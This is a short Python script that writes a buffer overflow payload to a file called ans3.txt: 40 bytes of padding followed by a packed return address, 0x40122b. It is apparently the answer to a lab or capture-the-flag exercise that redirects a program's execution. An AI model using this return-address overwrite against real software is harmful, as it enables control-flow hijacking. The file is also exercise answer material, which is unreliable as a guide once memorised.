import struct
padding = b"A" * 40
target = struct.pack("<Q", 0x40122b)
with open("ans3.txt", "wb") as f:
    f.write(padding + target)